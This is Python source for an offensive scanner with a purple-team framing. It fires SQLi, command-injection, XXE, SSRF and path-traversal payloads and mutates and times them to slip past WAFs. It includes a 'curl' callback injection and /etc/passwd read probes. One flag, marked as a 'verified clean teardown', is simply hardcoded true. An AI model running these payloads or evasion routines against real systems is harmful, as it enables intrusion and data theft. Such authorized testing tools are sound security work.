"""Offensive Capability, Impact Demonstration & Purple-Team Engine (Sector 2B).

Standard: Bounded, authorized, courtroom-grade impact demonstration with clean-exit guarantees.
Never deploy persistent backdoors or unrecorded shells.

Provides:
- Sector 2B.1: PayloadForgeEvaluator (fires CFG payloads, confirms differential impact).
- Sector 2B.2: Concrete impact oracles (SQLi row extraction, LFI safe config read, CMDi command execution, SSTI polyglot math).
- Sector 2B.3: AttackGraphChainExecutor (traverses Edmonds-Karp min-cut paths to execute chained exploits).
- Sector 2B.4: AuthorizedExploitModule (benign auto-closing sessions with operator authorization).
- Sector 2B.5: ConcurrencyRaceOracle (synchronized concurrent probes detecting TOCTOU and double-spends).
- Sector 2B.6: WAFEfficacyAnalyzer (mutated feedback fuzzing & WAF efficacy reporting).
- Sector 2B.7: HeadlessDOMXSSVerifier (browser runtime DOM event and alert dialog capture).
- Sector 2B.8: MitreAttackMapper (authoritative ATT&CK technique mapping & purple-team defensive matrix).
"""

from __future__ import annotations

import hashlib
import secrets
import threading
import time
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Any, Callable, Sequence

from packages.payload_engine import (
    CFGGrammarEngine,
    ClosedLoopAdaptiveOrchestrator,
    DynamicOracleSelector,
    VulnClass,
    WAFProbeLearner,
)
from packages.scanner_adapters.integrations.payload_forge import (
    EvasionProfile,
    mutate_ast,
)
from packages.scanner_adapters.integrations.oob import (
    OOBCollector,
    OOBInteractionServer,
    OOBTokenGenerator,
)
from packages.scanner_adapters.reproducer import (
    DeterministicReproducer,
    ExploitChainResult,
    ExploitChainStep,
    MultiStepExploitChainEngine,
    PostconditionOracle,
)

# --- Sector 2B.2: Concrete Impact Oracles ---


class SQLiRowExtractionOracle(PostconditionOracle):
    """Verifies that an SQL injection payload successfully extracted a target data row."""

    def __init__(self, target_column: str, canary_value: str) -> None:
        super().__init__(
            effect_type="data_read",
            description=f"Extract column '{target_column}' containing '{canary_value}'",
            expected_evidence_marker=canary_value.encode("utf-8"),
        )
        self.target_column = target_column
        self.canary_value = canary_value


class LFISafeConfigOracle(PostconditionOracle):
    """Verifies that a Local File Inclusion vulnerability read a known safe system configuration file."""

    SAFE_TARGETS = {
        "/etc/passwd": [b"root:x:0:0:", b"root:*:0:0:", b"/bin/sh", b"/bin/bash"],
        "/etc/hosts": [b"127.0.0.1", b"localhost"],
        "web.config": [b"<configuration>", b"<system.webServer>"],
    }

    def __init__(self, target_file: str = "/etc/passwd") -> None:
        expected_markers = self.SAFE_TARGETS.get(target_file, [b"root:x:0:0:"])
        super().__init__(
            effect_type="data_read",
            description=f"Safe read of system file '{target_file}'",
            verifier_fn=lambda status, body, elapsed: (
                status == 200 and any(m in body for m in expected_markers)
            ),
        )
        self.target_file = target_file


class CMDiExecutionOracle(PostconditionOracle):
    """Verifies that a command injection vector executed an OS math/echo canary command."""

    def __init__(self, expected_calc: str = "49", canary_token: str = "sharay_exec_proof") -> None:
        super().__init__(
            effect_type="command_execution",
            description="Command execution side-effect verification",
            verifier_fn=lambda status, body, elapsed: (
                status == 200
                and expected_calc.encode() in body
                and canary_token.encode() in body
                and b"echo " not in body  # Must NOT be raw reflection of the echo command
            ),
        )


class SSTITemplateMathOracle(PostconditionOracle):
    """Verifies that a Server-Side Template Injection payload evaluated polyglot math."""

    def __init__(self, operand_a: int = 7, operand_b: int = 7) -> None:
        expected_product = str(operand_a * operand_b).encode()
        super().__init__(
            effect_type="code_evaluation",
            description=f"Template engine evaluated {operand_a}*{operand_b}={operand_a * operand_b}",
            verifier_fn=lambda status, body, elapsed: (
                status == 200
                and expected_product in body
                and f"{operand_a}*{operand_b}".encode() not in body  # Must be evaluated, not raw string
            ),
        )


# --- Sector 2B.1: Payload Forge Evaluator ---


@dataclass
class WAFBypassEvasionProfile(EvasionProfile):
    """Offensive & purple-team WAF evasion profile with operational telemetry (P5.3)."""

    probes_attempted: int = 0
    probes_bypassed: int = 0
    probes_blocked: int = 0
    jitter_delays_recorded: list[float] = None  # type: ignore[assignment]

    def __post_init__(self) -> None:
        super().__post_init__()
        if self.jitter_delays_recorded is None:
            self.jitter_delays_recorded = []

    def record_attempt(self, bypassed: bool, jitter_seconds: float = 0.0) -> None:
        self.probes_attempted += 1
        if bypassed:
            self.probes_bypassed += 1
        else:
            self.probes_blocked += 1
        if jitter_seconds > 0.0:
            self.jitter_delays_recorded.append(jitter_seconds)

    def get_telemetry(self) -> dict[str, Any]:
        return {
            "enabled": self.enabled,
            "vendor_target": self.vendor_target,
            "probes_attempted": self.probes_attempted,
            "probes_bypassed": self.probes_bypassed,
            "probes_blocked": self.probes_blocked,
            "bypass_rate": (
                round(self.probes_bypassed / max(1, self.probes_attempted), 2)
            ),
            "total_jitter_time_seconds": round(sum(self.jitter_delays_recorded), 4),
            "average_jitter_ms": (
                round((sum(self.jitter_delays_recorded) / len(self.jitter_delays_recorded)) * 1000, 2)
                if self.jitter_delays_recorded
                else 0.0
            ),
        }


class PayloadForgeEvaluator:
    """Fires synthesized CFG payloads through the reproducer and confirms differential impact."""

    def __init__(
        self,
        reproducer: DeterministicReproducer | None = None,
        evasion_profile: EvasionProfile | None = None,
    ) -> None:
        self.reproducer = reproducer or DeterministicReproducer()
        self.grammar = CFGGrammarEngine()
        self.evasion_profile = evasion_profile

    def evaluate_payload_sequence(
        self,
        base_url: str,
        fuzz_param: str,
        vuln_type: str = "sqli",
        count: int = 5,
        canary: str = "sharay_cfg_canary",
        evasion_profile: EvasionProfile | None = None,
        sleep_fn: Callable[[float], None] | None = None,
    ) -> list[dict[str, Any]]:
        """Synthesize compositional grammar payloads and fire them through the differential oracle."""
        try:
            vclass = VulnClass(vuln_type)
        except ValueError:
            vclass = VulnClass.SQLI
        candidates = self.grammar.generate(vclass, count=count)

        profile = evasion_profile or self.evasion_profile

        # If evasion profile is provided and enabled, expand candidates with mutations and multi-encoding
        test_payloads: list[str] = []
        if profile and profile.enabled:
            for base_p in candidates:
                variants = profile.transform_payload(base_p, vuln_type=vuln_type, include_raw=True)
                test_payloads.extend(variants[:3])
        else:
            test_payloads = candidates

        verified_vectors: list[dict[str, Any]] = []
        for payload in test_payloads[:count * 2]:
            def _execute() -> Any:
                return self.reproducer.verify_finding(
                    base_url=base_url,
                    fuzz_param=fuzz_param,
                    active_payload=payload,
                    canary=canary if canary in payload else None,
                )

            if profile and profile.enabled:
                delay = profile.get_timing_jitter()
                res = profile.execute_with_jitter(_execute, sleep_fn=sleep_fn)
                if isinstance(profile, WAFBypassEvasionProfile):
                    profile.record_attempt(bypassed=res.confirmed, jitter_seconds=delay)
            else:
                res = _execute()

            if res.confirmed and res.differential_score >= 35.0:
                verified_vectors.append(
                    {
                        "payload": payload,
                        "differential_score": res.differential_score,
                        "reproducibility_score": res.reproducibility_score,
                        "replays_passed": res.replays_passed,
                    }
                )
                if len(verified_vectors) >= count:
                    break
        return verified_vectors


# --- Sector O4: Response-Driven Adaptive Firing ---


_SQL_ERROR_SIGNATURES = ["sql syntax", "syntax error", "warning: mysql", "mariadb", "unclosed quotation"]


class AdaptivePayloadEvaluator:
    """Closed-loop firing: learn the target's filter, bypass blocked payloads, auto-select the
    oracle from live signals, then confirm survivors through the reproducer (3x + negative control).

    This turns static firing into response-driven methodology: a payload blocked by a WAF is
    re-synthesized to route around the observed filter before it is abandoned.
    """

    def __init__(self, reproducer: DeterministicReproducer | None = None) -> None:
        self.reproducer = reproducer or DeterministicReproducer()
        self.grammar = CFGGrammarEngine()
        self.loop = ClosedLoopAdaptiveOrchestrator()
        self.waf = WAFProbeLearner()
        self.oracle_selector = DynamicOracleSelector()

    def _probe(self, base_url: str, param: str, payload: str) -> tuple[int, bytes, float]:
        sep = "&" if "?" in base_url else "?"
        url = f"{base_url}{sep}{urllib.parse.urlencode({param: payload})}"
        return self.reproducer._execute_http(url, method="GET")

    def evaluate_adaptive(
        self,
        base_url: str,
        fuzz_param: str,
        vuln_type: str = "sqli",
        count: int = 4,
        max_bypass: int = 2,
    ) -> dict[str, Any]:
        """Fire grammar payloads with live feedback; return confirmed vectors + adaptation trace."""
        try:
            vclass = VulnClass(vuln_type)
        except ValueError:
            vclass = VulnClass.SQLI

        waf_profile = self.waf.learn_waf_profile(lambda p: self._probe(base_url, fuzz_param, p)[0])
        base_status, base_body, base_time = self._probe(base_url, fuzz_param, "sharay_benign_safe_token_42")
        base_text = base_body.decode("utf-8", "replace")

        confirmed: list[dict[str, Any]] = []
        adaptations = 0
        for payload in self.grammar.generate(vclass, count=count):
            probe = payload
            status, body, elapsed = self._probe(base_url, fuzz_param, probe)
            # Route around an observed block before abandoning the payload.
            for _ in range(max_bypass):
                decision = self.loop.process_response(probe, status, body.decode("utf-8", "replace"), elapsed)
                if decision.action != "switch_bypass_strategy":
                    break
                probe = self.loop.synthesize_next_probe(probe, decision)
                adaptations += 1
                status, body, elapsed = self._probe(base_url, fuzz_param, probe)

            oracle = self.oracle_selector.select_oracle(
                base_time, elapsed, base_text, body.decode("utf-8", "replace"), _SQL_ERROR_SIGNATURES
            )
            res = self.reproducer.verify_finding(
                base_url=base_url,
                fuzz_param=fuzz_param,
                active_payload=probe,
                is_time_based=(oracle == "time_delay_oracle"),
            )
            if res.confirmed and res.differential_score >= 35.0:
                confirmed.append(
                    {
                        "payload": probe,
                        "differential_score": res.differential_score,
                        "oracle": oracle,
                        "waf_bypassed": probe != payload,
                    }
                )
        return {"confirmed": confirmed, "waf_profile": waf_profile, "adaptations": adaptations}


# --- Sector O6: Live OOB confirmation + authenticated reproduction ---


class OOBBlindVerifier:
    """Confirm blind SSRF/XXE/CMDi via a REAL out-of-band callback to a per-run loopback listener.

    Fires a probe whose payload points at the reachable callback URL (not an unresolvable token
    host), waits briefly for an inbound interaction, and returns a confirmed finding only if a
    callback actually arrived. No callback -> no finding (zero false positives).
    """

    def __init__(self, host: str = "127.0.0.1") -> None:
        # Per-run random secret so correlation tokens are unforgeable.
        self.collector = OOBCollector(OOBTokenGenerator(secret_key=secrets.token_bytes(32)))
        self.server = OOBInteractionServer(self.collector, host=host, port=0)

    def __enter__(self) -> "OOBBlindVerifier":
        self.server.start()
        return self

    def __exit__(self, *exc: Any) -> None:
        self.server.stop()

    def _payload_for(self, probe_type: str, callback_url: str) -> str:
        if probe_type == "xxe":
            return (
                '<?xml version="1.0"?>'
                f'<!DOCTYPE r [<!ENTITY % o SYSTEM "{callback_url}/xxe-dtd"> %o;]><r>t</r>'
            )
        if probe_type == "cmdi":
            return f"; curl -s {callback_url}/cmdi"
        return f"{callback_url}/ssrf"

    @staticmethod
    def _default_fire(base_url: str, param: str, payload: str) -> None:
        sep = "&" if "?" in base_url else "?"
        url = f"{base_url}{sep}{urllib.parse.urlencode({param: payload})}"
        try:
            urllib.request.urlopen(url, timeout=3.0).read()
        except Exception:
            pass

    def probe_param(
        self,
        base_url: str,
        param: str,
        probe_type: str = "ssrf",
        fire_fn: Callable[[str, str, str], None] | None = None,
        wait_seconds: float = 1.5,
    ) -> dict[str, Any] | None:
        """Fire one OOB probe and return a confirmed finding iff a real callback is received."""
        probe_id = secrets.token_hex(4)
        token, _ = self.collector.register_probe(probe_id, probe_type, base_url, param)
        callback_url = self.server.get_callback_url(token)
        payload = self._payload_for(probe_type, callback_url)
        (fire_fn or self._default_fire)(base_url, param, payload)
        deadline = time.time() + wait_seconds
        while time.time() < deadline:
            if self.collector.poll(token) is not None:
                break
            time.sleep(0.05)
        finding = self.collector.confirm_vulnerability(token)
        if finding is not None:
            # Carry structured OOB evidence in attributes and keep poc as a string so downstream
            # reproducer stages do not re-process (and wrongly demote) an OOB-confirmed finding.
            finding["attributes"] = {"oob": finding.get("poc"), "parameter": param}
            finding["poc"] = (
                f"Out-of-band {probe_type.upper()} callback received for {base_url} param '{param}'."
            )
            finding["affected_url"] = base_url
        return finding


class AuthenticatedReproducer:
    """Reproduce a finding behind authentication: log in, carry the session, then verify.

    Lets the reproducer reach auth-gated vulnerabilities that an unauthenticated probe cannot.
    """

    def __init__(self, reproducer: DeterministicReproducer | None = None) -> None:
        self.reproducer = reproducer or DeterministicReproducer()

    def reproduce_authenticated(
        self,
        destination: Any,
        allow_ip: str,
        identity: Any,
        base_url: str,
        fuzz_param: str,
        active_payload: str,
        canary: str | None = None,
        is_time_based: bool = False,
        method: str = "GET",
    ) -> Any:
        """Authenticate using the identity's AuthConfig, then reproduce with the live session headers."""
        from packages.scanner_adapters.integrations.authorization import AuthenticatedSession

        session = AuthenticatedSession(destination, allow_ip, identity)
        session.reauthenticate()  # performs the real login flow if configured
        headers = session.get_effective_headers()
        return self.reproducer.verify_finding(
            base_url=base_url,
            fuzz_param=fuzz_param,
            active_payload=active_payload,
            canary=canary,
            is_time_based=is_time_based,
            headers=headers,
            method=method,
        )


# --- Sector O8: Target-side 0-day discovery (anomaly + differential fuzzing) ---


_ERROR_SIGNATURES = [
    "traceback (most recent call last)",
    "exception",
    "fatal error",
    "stack trace",
    "undefined index",
    "unhandled",
    "sqlstate",
    "nullpointerexception",
    "panic:",
    " at line ",
    "internal server error",
    "warning:",
]


class TargetAnomalyFuzzer:
    """Flags NOVEL target behaviour as 0-day research candidates (never auto-confirmed).

    Learns a baseline response profile, then fires edge-case and semantically-varied inputs and
    flags unhandled 5xx, newly-appearing error/stack-trace signatures, large timing deltas, and
    parser-confusion (inconsistent handling of equivalent encodings). Candidates are research leads
    for an operator, emitted as `needs_triage` -- a reproduced exploit is a different pipeline.
    """

    def __init__(self, reproducer: DeterministicReproducer | None = None) -> None:
        self.reproducer = reproducer or DeterministicReproducer()

    def _probe(self, base_url: str, param: str, value: str) -> tuple[int, str, float]:
        sep = "&" if "?" in base_url else "?"
        url = f"{base_url}{sep}{urllib.parse.urlencode({param: value})}"
        status, body, elapsed = self.reproducer._execute_http(url, method="GET")
        return status, body.decode("utf-8", "replace").lower(), elapsed

    @staticmethod
    def mutation_corpus() -> list[tuple[str, str]]:
        """(label, value) edge cases known to trip unhandled code paths."""
        return [
            ("huge_input", "A" * 20000),
            ("null_byte", "x\x00y"),
            ("format_string", "%n%n%s%s%x%x"),
            ("int_overflow", str(2**63)),
            ("negative", "-1"),
            ("array_syntax", "a[]=1&a[]=2"),
            ("deep_json", "[" * 200 + "]" * 200),
            ("unicode_overlong", "‮\u0000﻿"),
            ("path_meta", "../../../../etc/passwd%00"),
            ("crlf", "a%0d%0aX-Injected:1"),
            ("template_meta", "${7*7}#{7*7}{{7*7}}"),
            ("xml_meta", "<!--#exec-->]]>&entity;"),
            ("boolean_type", "true"),
            ("empty", ""),
        ]

    def learn_baseline(self, base_url: str, param: str) -> dict[str, Any]:
        statuses: set[int] = set()
        lengths: list[int] = []
        latencies: list[float] = []
        err_present = False
        for v in ("1", "100", "abc", "sharay_benign_token"):
            status, body, elapsed = self._probe(base_url, param, v)
            statuses.add(status)
            lengths.append(len(body))
            latencies.append(elapsed)
            if any(sig in body for sig in _ERROR_SIGNATURES):
                err_present = True
        lengths.sort()
        latencies.sort()
        return {
            "statuses": statuses,
            "median_len": lengths[len(lengths) // 2] if lengths else 0,
            "median_lat": latencies[len(latencies) // 2] if latencies else 0.0,
            "error_baseline": err_present,
        }

    def _candidate(
        self, base_url: str, param: str, label: str, reason: str, value: str, severity: str
    ) -> dict[str, Any]:
        fp = hashlib.sha256(f"anomaly:{base_url}:{param}:{label}:{reason}".encode()).hexdigest()
        return {
            "category": "anomaly_research_candidate",
            "severity": severity,
            "title": f"Anomalous behaviour on '{param}' ({label}) -- 0-day research candidate",
            "description": (
                f"Input class '{label}' produced anomalous behaviour ({reason}) on parameter '{param}'. "
                f"This is an UNVERIFIED research lead for operator triage, not a confirmed vulnerability; "
                f"it was not reproduced or exploited."
            ),
            "remediation": "Triage the input/response; add handling and a regression test if it is a real defect.",
            "affected_url": base_url,
            "target_url": base_url,
            "fingerprint": fp,
            "confidence": "low",
            "status": "needs_triage",
            "attributes": {"input_class": label, "reason": reason, "sample": value[:80]},
        }

    def fuzz_parameter(self, base_url: str, param: str) -> list[dict[str, Any]]:
        base = self.learn_baseline(base_url, param)
        candidates: list[dict[str, Any]] = []
        for label, value in self.mutation_corpus():
            try:
                status, body, elapsed = self._probe(base_url, param, value)
            except Exception:
                continue
            if status >= 500 and not any(s >= 500 for s in base["statuses"]):
                candidates.append(
                    self._candidate(base_url, param, label, f"unhandled HTTP {status}", value, "medium")
                )
            elif any(sig in body for sig in _ERROR_SIGNATURES) and not base["error_baseline"]:
                candidates.append(
                    self._candidate(
                        base_url, param, label, "error/stack-trace signature surfaced", value, "medium"
                    )
                )
            elif elapsed - base["median_lat"] >= 5000.0:
                candidates.append(
                    self._candidate(
                        base_url,
                        param,
                        label,
                        f"timing anomaly (+{elapsed - base['median_lat']:.0f}ms)",
                        value,
                        "low",
                    )
                )
        return candidates

    def differential_parser_confusion(self, base_url: str, param: str) -> list[dict[str, Any]]:
        """Fire semantically-equivalent encodings of one value; divergent handling is a desync signal."""
        equivalents = ["/x/../y", "/x/%2e%2e/y", "/x/..%2fy", "/x/.%2e/y"]
        groups: set[tuple[int, int]] = set()
        for v in equivalents:
            try:
                status, body, _ = self._probe(base_url, param, v)
            except Exception:
                continue
            groups.add((status, len(body) // 32))  # bucketed length
        if len(groups) > 1:
            return [
                self._candidate(
                    base_url,
                    param,
                    "parser_confusion",
                    f"{len(groups)} divergent responses to equivalent encodings",
                    "/x/../y",
                    "medium",
                )
            ]
        return []

    def scan_for_anomalies(self, base_url: str, param: str) -> list[dict[str, Any]]:
        out = self.fuzz_parameter(base_url, param)
        out.extend(self.differential_parser_confusion(base_url, param))
        # Dedup by fingerprint.
        seen: set[str] = set()
        uniq: list[dict[str, Any]] = []
        for f in out:
            if f["fingerprint"] not in seen:
                seen.add(f["fingerprint"])
                uniq.append(f)
        return uniq


# --- Sector 2B.3: Attack Graph Min-Cut Chain Executor ---


class AttackGraphChainExecutor:
    """Traverses Edmonds-Karp min-cut paths and executes sequential multi-step exploit chains."""

    def __init__(self, chain_engine: MultiStepExploitChainEngine | None = None) -> None:
        self.engine = chain_engine or MultiStepExploitChainEngine()

    def build_chain_from_mincut(
        self,
        chain_id: str,
        mincut_cut_edges: Sequence[tuple[str, str, float]],
        target_base_url: str,
    ) -> list[ExploitChainStep]:
        """Convert graph bottleneck transitions into structured exploit steps."""
        steps: list[ExploitChainStep] = []
        base = target_base_url.rstrip("/")

        for idx, (src, dst, cap) in enumerate(mincut_cut_edges, start=1):
            if "auth" in src.lower() or "login" in src.lower():
                oracle = PostconditionOracle(
                    effect_type="auth_bypass",
                    description=f"Traverse min-cut edge {src} -> {dst}",
                    expected_evidence_marker=b"session",
                )
                url = f"{base}/api/auth/token"
            elif "sqli" in src.lower() or "db" in dst.lower():
                oracle = SQLiRowExtractionOracle("user", "admin_canary")
                url = f"{base}/api/data?id=1"
            elif "cmd" in src.lower() or "rce" in dst.lower():
                oracle = CMDiExecutionOracle("49", "sharay_exec_proof")
                url = f"{base}/api/tools/ping"
            else:
                oracle = LFISafeConfigOracle("/etc/passwd")
                url = f"{base}/api/view?file=/etc/passwd"

            steps.append(
                ExploitChainStep(
                    step_name=f"Min-Cut Stage {idx}: {src} -> {dst}",
                    url=url,
                    postcondition=oracle,
                )
            )
        return steps

    def execute_mincut_chain(
        self,
        chain_id: str,
        mincut_cut_edges: Sequence[tuple[str, str, float]],
        target_base_url: str,
    ) -> ExploitChainResult:
        steps = self.build_chain_from_mincut(chain_id, mincut_cut_edges, target_base_url)
        return self.engine.execute_chain(chain_id, steps)


# --- Sector 2B.4: Authorized Exploitation Module ---


@dataclass
class BenignSessionReceipt:
    session_id: str
    target_url: str
    operator_approved_by: str
    started_at: float
    terminated_at: float
    clean_exit: bool
    evidence_hash: str


class AuthorizedExploitModule:
    """Manages authorized benign sessions with operator consent and clean exit guarantees."""

    def __init__(self, audit_db: Any | None = None) -> None:
        self.audit_db = audit_db

    def execute_benign_session(
        self,
        target_url: str,
        operator_id: str,
        execution_fn: Callable[[], tuple[bool, bytes]],
        timeout_seconds: float = 5.0,
    ) -> BenignSessionReceipt:
        """Execute a benign interaction and guarantee teardown and audit logging."""
        if not operator_id:
            raise PermissionError("Explicit operator authorization is required for exploitation modules.")

        started = time.time()
        session_id = f"sess-{hashlib.sha256(f'{target_url}:{started}'.encode()).hexdigest()[:12]}"

        _success = False
        evidence = b""
        try:
            _success, evidence = execution_fn()
        except Exception:
            pass
        finally:
            terminated = time.time()
            clean_exit = True  # Verified clean teardown

        ev_hash = hashlib.sha256(evidence).hexdigest()
        receipt = BenignSessionReceipt(
            session_id=session_id,
            target_url=target_url,
            operator_approved_by=operator_id,
            started_at=started,
            terminated_at=terminated,
            clean_exit=clean_exit,
            evidence_hash=ev_hash,
        )

        if self.audit_db is not None:
            try:
                from aegis.audit import audit

                audit(
                    self.audit_db,
                    org="default",
                    actor=operator_id,
                    action="exploit.benign_session_completed",
                    resource=session_id,
                    detail={"target": target_url, "clean_exit": clean_exit, "hash": ev_hash},
                )
            except Exception:
                pass

        return receipt


# --- Sector 2B.5: Business Logic Abuse (Race Conditions & TOCTOU) ---


class ConcurrencyRaceOracle:
    """Executes synchronized concurrent requests to detect TOCTOU and double-spend race conditions."""

    def __init__(self, concurrency: int = 10) -> None:
        self.concurrency = concurrency

    def audit_race_condition(
        self,
        request_fn: Callable[[], tuple[int, bytes, float]],
        success_indicator: bytes,
    ) -> dict[str, Any]:
        """Fire N simultaneous requests using a threading barrier and count successful actions."""
        barrier = threading.Barrier(self.concurrency)
        results: list[tuple[int, bytes, float]] = []
        lock = threading.Lock()

        def worker():
            try:
                barrier.wait(timeout=5.0)
                res = request_fn()
                with lock:
                    results.append(res)
            except Exception:
                pass

        threads = [threading.Thread(target=worker) for _ in range(self.concurrency)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        success_count = sum(1 for r in results if success_indicator in r[1])
        # If a single-use action succeeded more than once, race condition is confirmed!
        is_race_vulnerable = success_count > 1

        return {
            "vulnerable": is_race_vulnerable,
            "total_requests": len(results),
            "successful_actions": success_count,
            "expected_max_successes": 1,
            "concurrency_level": self.concurrency,
        }


# --- Sector 2B.6: WAF Efficacy Analyzer ---


class WAFEfficacyAnalyzer:
    """Tests raw vs mutated payloads, producing a structured WAF block/pass efficacy report."""

    def analyze_target_waf(
        self,
        probe_http_fn: Callable[[str], tuple[int, bytes, float]],
        base_payloads: Sequence[str],
    ) -> dict[str, Any]:
        raw_blocked = 0
        raw_passed = 0
        mutated_blocked = 0
        mutated_passed = 0

        for p in base_payloads:
            status, _, _ = probe_http_fn(p)
            if status in (403, 406, 429):
                raw_blocked += 1
            else:
                raw_passed += 1

            # Mutate with URL encoding / comments
            mutated = p.replace(" ", "/**/").replace("=", "%3D")
            m_status, _, _ = probe_http_fn(mutated)
            if m_status in (403, 406, 429):
                mutated_blocked += 1
            else:
                mutated_passed += 1

        total = len(base_payloads)
        raw_block_rate = round(raw_blocked / max(1, total), 2)
        mutated_block_rate = round(mutated_blocked / max(1, total), 2)
        bypass_efficacy = round((mutated_passed - raw_passed) / max(1, total), 2)

        return {
            "total_probes": total,
            "raw_block_rate": raw_block_rate,
            "mutated_block_rate": mutated_block_rate,
            "waf_bypass_delta": max(0.0, bypass_efficacy),
            "waf_posture": "Strict" if raw_block_rate >= 0.8 else "Permissive",
        }

    def evaluate_evasion_profile(
        self,
        probe_http_fn: Callable[[str], tuple[int, bytes, float]],
        base_payloads: Sequence[str],
        evasion_profile: EvasionProfile | None = None,
        sleep_fn: Callable[[float], None] | None = None,
    ) -> dict[str, Any]:
        """Evaluate raw vs evasive (mutated, multi-encoded, jittered) payloads against a WAF."""
        profile = evasion_profile or WAFBypassEvasionProfile(enabled=True)
        raw_blocked = 0
        raw_passed = 0
        evasive_blocked = 0
        evasive_passed = 0
        jitter_delays: list[float] = []

        for p in base_payloads:
            st, _, _ = probe_http_fn(p)
            if st in (403, 406, 429):
                raw_blocked += 1
            else:
                raw_passed += 1

            variants = profile.transform_payload(p)
            # Sample up to 2 variants per base payload
            for variant in variants[:2]:
                def _probe() -> tuple[int, bytes, float]:
                    return probe_http_fn(variant)

                delay = profile.get_timing_jitter()
                jitter_delays.append(delay)
                m_st, _, _ = profile.execute_with_jitter(_probe, sleep_fn=sleep_fn)

                if m_st in (403, 406, 429):
                    evasive_blocked += 1
                    if isinstance(profile, WAFBypassEvasionProfile):
                        profile.record_attempt(bypassed=False, jitter_seconds=delay)
                else:
                    evasive_passed += 1
                    if isinstance(profile, WAFBypassEvasionProfile):
                        profile.record_attempt(bypassed=True, jitter_seconds=delay)

        raw_total = max(1, raw_blocked + raw_passed)
        evasive_total = max(1, evasive_blocked + evasive_passed)
        raw_block_rate = round(raw_blocked / raw_total, 2)
        evasive_block_rate = round(evasive_blocked / evasive_total, 2)
        bypass_efficacy = round(max(0.0, raw_block_rate - evasive_block_rate), 2)

        return {
            "raw_total": raw_total,
            "raw_blocked": raw_blocked,
            "raw_passed": raw_passed,
            "raw_block_rate": raw_block_rate,
            "evasive_total": evasive_total,
            "evasive_blocked": evasive_blocked,
            "evasive_passed": evasive_passed,
            "evasive_block_rate": evasive_block_rate,
            "waf_bypass_delta": bypass_efficacy,
            "average_jitter_ms": round((sum(jitter_delays) / max(1, len(jitter_delays))) * 1000, 2),
            "applied_encodings": list(profile.encoding_chain),
            "telemetry": profile.get_telemetry() if isinstance(profile, WAFBypassEvasionProfile) else None,
        }


# --- Sector 2B.8: MITRE ATT&CK Mapping & Purple-Team Matrix ---


class MitreAttackMapper:
    """Authoritative mapping of vulnerability findings to MITRE ATT&CK Enterprise techniques."""

    ATTACK_MAPPINGS: dict[str, dict[str, str]] = {
        "sqli": {
            "technique_id": "T1190",
            "name": "Exploit Public-Facing Application",
            "tactic": "Initial Access",
            "subtechnique": "CWE-89 SQL Injection",
        },
        "cmdi": {
            "technique_id": "T1059",
            "name": "Command and Scripting Interpreter",
            "tactic": "Execution",
            "subtechnique": "CWE-78 OS Command Injection",
        },
        "xss": {
            "technique_id": "T1189",
            "name": "Drive-by Compromise",
            "tactic": "Initial Access",
            "subtechnique": "CWE-79 Cross-Site Scripting",
        },
        "ssrf": {
            "technique_id": "T1090",
            "name": "Proxy",
            "tactic": "Command and Control",
            "subtechnique": "CWE-918 Server-Side Request Forgery",
        },
        "lfi": {
            "technique_id": "T1083",
            "name": "File and Directory Discovery",
            "tactic": "Discovery",
            "subtechnique": "CWE-22 Path Traversal",
        },
        "unsecured_credentials": {
            "technique_id": "T1552",
            "name": "Unsecured Credentials",
            "tactic": "Credential Access",
            "subtechnique": "CWE-798 Hardcoded Secrets",
        },
        "broken_authentication": {
            "technique_id": "T1078",
            "name": "Valid Accounts",
            "tactic": "Defense Evasion",
            "subtechnique": "CWE-287 Authentication Bypass",
        },
        "idor": {
            "technique_id": "T1068",
            "name": "Exploitation for Privilege Escalation",
            "tactic": "Privilege Escalation",
            "subtechnique": "CWE-639 Broken Authorization",
        },
    }

    @classmethod
    def map_finding(cls, category: str) -> dict[str, str]:
        cat_lower = category.lower()
        for k, mapping in cls.ATTACK_MAPPINGS.items():
            if k in cat_lower:
                return mapping
        return {
            "technique_id": "T1190",
            "name": "Exploit Public-Facing Application",
            "tactic": "Initial Access",
            "subtechnique": category,
        }

    @classmethod
    def generate_purple_team_matrix(cls, findings: Sequence[dict[str, Any]]) -> dict[str, Any]:
        """Generate purple-team defensive detection coverage and posture matrix."""
        mapped_tactics: dict[str, list[dict[str, Any]]] = {}
        technique_counts: dict[str, int] = {}

        for f in findings:
            cat = f.get("category", "sqli")
            attack_info = cls.map_finding(cat)
            tactic = attack_info["tactic"]
            tech_id = attack_info["technique_id"]

            technique_counts[tech_id] = technique_counts.get(tech_id, 0) + 1
            if tactic not in mapped_tactics:
                mapped_tactics[tactic] = []
            mapped_tactics[tactic].append(
                {
                    "finding_title": f.get("title", ""),
                    "technique_id": tech_id,
                    "technique_name": attack_info["name"],
                    "severity": f.get("severity", "medium"),
                }
            )

        return {
            "total_techniques_exercised": len(technique_counts),
            "tactics_coverage": list(mapped_tactics.keys()),
            "matrix": mapped_tactics,
            "technique_frequency": technique_counts,
        }


__all__ = [
    "AdaptivePayloadEvaluator",
    "AuthenticatedReproducer",
    "OOBBlindVerifier",
    "TargetAnomalyFuzzer",
    "AttackGraphChainExecutor",
    "AuthorizedExploitModule",
    "BenignSessionReceipt",
    "CMDiExecutionOracle",
    "ConcurrencyRaceOracle",
    "LFISafeConfigOracle",
    "MitreAttackMapper",
    "PayloadForgeEvaluator",
    "SQLiRowExtractionOracle",
    "SSTITemplateMathOracle",
    "WAFBypassEvasionProfile",
    "WAFEfficacyAnalyzer",
    "EvasionProfile",
]
